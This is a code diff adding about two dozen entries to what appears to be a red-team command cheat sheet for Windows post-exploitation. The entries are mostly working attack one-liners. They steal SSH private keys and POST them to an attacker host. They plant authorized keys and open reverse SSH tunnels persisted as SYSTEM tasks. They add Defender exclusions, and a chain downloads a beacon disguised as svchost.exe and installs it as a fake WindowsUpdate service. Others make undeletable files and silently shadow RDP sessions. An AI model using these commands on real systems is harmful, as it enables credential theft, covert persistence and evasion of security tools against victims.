@@ -1643,6 +1643,150 @@ const COMMANDS = [
     tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
+  {
+    title: "Create Unkillable File (SYSTEM Owner)",
+    code: "$p='C:\\Windows\\Tasks\\legit.txt'; Set-Content $p 'protected'; icacls $p /setowner 'NT AUTHORITY\\SYSTEM'; icacls $p /deny 'Administrators:(D)' /deny 'Everyone:(D)'",
+    tags: ["ps", "persist", "postexploit"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "Create Unkillable File (TrustedInstaller)",
+    code: "icacls C:\\Windows\\Tasks\\file.txt /setowner 'NT SERVICE\\TrustedInstaller'",
+    tags: ["cmd", "persist", "postexploit"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "Delete Protected File (Need SYSTEM)",
+    code: "takeown /f C:\\Windows\\Tasks\\file.txt /a; icacls C:\\Windows\\Tasks\\file.txt /grant Administrators:F; del C:\\Windows\\Tasks\\file.txt",
+    tags: ["cmd", "postexploit"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Find All SSH Keys",
+    code: "Get-ChildItem C:\\Users\\*\\.ssh\\* -EA SilentlyContinue | Select-Object FullName",
+    tags: ["ps", "recon", "postexploit"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Read SSH Private Key",
+    code: "type C:\\Users\\victim\\.ssh\\id_rsa\ntype C:\\Users\\victim\\.ssh\\id_ed25519",
+    tags: ["cmd", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Exfil SSH Keys via HTTP",
+    code: "$k = Get-ChildItem C:\\Users\\*\\.ssh\\* -EA SilentlyContinue | Get-Content -Raw; IWR -Uri 'http://VPS:8080/keys' -Method POST -Body $k",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Base64 SSH Key for Copy",
+    code: "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\victim\\.ssh\\id_rsa'))",
+    tags: ["ps", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Install OpenSSH Server",
+    code: "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0\nStart-Service sshd\nSet-Service -Name sshd -StartupType Automatic",
+    tags: ["ps", "persist", "lateral"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "OpenSSH Firewall Rule",
+    code: "New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22",
+    tags: ["ps", "firewall", "persist"],
+    accent: "#3498db"
+  },
+  {
+    title: "Add SSH Authorized Key",
+    code: "mkdir C:\\Users\\Administrator\\.ssh -Force; Add-Content C:\\Users\\Administrator\\.ssh\\authorized_keys 'YOUR_PUBKEY_HERE'",
+    tags: ["ps", "persist", "lateral"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "Reverse SSH Tunnel to VPS",
+    code: "ssh -R 2222:localhost:22 -i C:\\Users\\Public\\key root@VPS_IP -N -f",
+    tags: ["cmd", "c2", "persist"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Persistent Reverse SSH Task",
+    code: "schtasks /create /tn 'Update' /tr 'ssh -R 2222:localhost:22 -i C:\\Users\\Public\\key root@VPS_IP -N' /sc onstart /ru SYSTEM /f",
+    tags: ["cmd", "persist", "c2"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "Connect via Reverse SSH (VPS)",
+    code: "ssh -p 2222 localhost",
+    tags: ["linux", "c2", "lateral"],
+    accent: "#00ff41"
+  },
+  {
+    title: "Add Exclusion Paths",
+    code: "Add-MpPreference -ExclusionPath 'C:\\Windows\\Tasks','C:\\Windows\\Temp','C:\\ProgramData','C:\\Users\\Public'",
+    tags: ["ps", "defender", "evasion"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Add Exclusion Extensions",
+    code: "Add-MpPreference -ExclusionExtension '.exe','.dll','.ps1','.bat'",
+    tags: ["ps", "defender", "evasion"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Add Exclusion Processes",
+    code: "Add-MpPreference -ExclusionProcess 'powershell.exe','cmd.exe','python.exe'",
+    tags: ["ps", "defender", "evasion"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Full SYSTEM Persistence Chain",
+    code: "Add-MpPreference -ExclusionPath 'C:\\Windows\\Tasks'\nIWR -Uri 'http://VPS/beacon.exe' -OutFile 'C:\\Windows\\Tasks\\svchost.exe'\nicacls 'C:\\Windows\\Tasks\\svchost.exe' /setowner 'NT AUTHORITY\\SYSTEM'\nsc create WindowsUpdate binPath= 'C:\\Windows\\Tasks\\svchost.exe' start= auto",
+    tags: ["ps", "persist", "playbook"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "RDP List Sessions",
+    code: "qwinsta",
+    tags: ["cmd", "recon", "postexploit"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "RDP Shadow (Watch Only)",
+    code: "mstsc /shadow:SESSION_ID /noConsentPrompt",
+    tags: ["cmd", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "RDP Shadow (Full Control)",
+    code: "mstsc /shadow:SESSION_ID /noConsentPrompt /control",
+    tags: ["cmd", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Enable RDP Shadow (Registry)",
+    code: "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow /t REG_DWORD /d 2 /f",
+    tags: ["cmd", "persist", "postexploit"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "Disable RDP Shadow",
+    code: "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow /t REG_DWORD /d 0 /f",
+    tags: ["cmd", "defender"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Check RDP Shadow Policy",
+    code: "reg query 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow",
+    tags: ["cmd", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Force RDP Shadow Consent",
+    code: "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow /t REG_DWORD /d 1 /f",
+    tags: ["cmd", "defender"],
+    accent: "#ff2a6d"
+  },
 ];
 
 const list = document.getElementById('cmdList');
